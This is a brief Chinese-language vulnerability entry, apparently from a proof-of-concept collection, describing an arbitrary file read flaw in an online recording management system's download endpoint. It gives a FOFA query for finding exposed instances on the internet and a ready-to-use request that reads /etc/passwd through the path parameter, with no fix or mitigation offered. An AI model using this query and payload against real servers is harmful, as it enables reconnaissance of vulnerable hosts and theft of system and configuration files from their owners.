# 在线录音管理系统-任意文件读取

### 1.漏洞描述

在线录音管理系统 download 接口存在一个任意文件读取漏洞，攻击者可以通过构造精心设计的请求，成功利用漏洞读取服务器上的任意文件，包括敏感系统文件和应用程序配置文件等。通过利用此漏洞，攻击者可能获得系统内的敏感信息，导致潜在的信息泄露风险。

### 2.fofa语法

```xml
title="在线录音管理系统"
```

### 3.漏洞复现

```xml
GET /main/download?path=/etc/passwd HTTP/1.1
```

![image](https://github.com/hardog123/poc-exp/assets/170905460/45e5cc39-df5e-4180-8c14-de1eee4e10c2)
